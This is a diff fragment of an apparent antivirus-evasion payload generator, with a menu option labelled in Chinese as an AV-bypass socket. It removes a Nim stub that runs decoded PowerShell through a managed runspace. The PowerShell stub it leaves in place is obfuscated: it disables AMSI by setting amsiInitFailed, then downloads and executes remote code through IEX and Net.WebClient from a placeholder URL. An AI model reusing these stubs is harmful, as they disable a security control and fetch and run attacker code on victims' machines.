@@ -58,17 +58,7 @@ Option_stub = """
  3.免杀套接字(Bypass Socket)
 """
 stub = """
-import winim/clr
-import base64
-var Automation = load("System.Management.Automation")
-var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
-var runspace = @RunspaceFactory.CreateRunspace()
-runspace.Open()
-var pipeline = runspace.CreatePipeline()
-let strdecode = decode("REPLACED")
-pipeline.Commands.AddScript(strdecode)
-pipeline.Invoke()
-runspace.Close()
+
 """
 PowerShell_stub = """
 Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("GREEN")
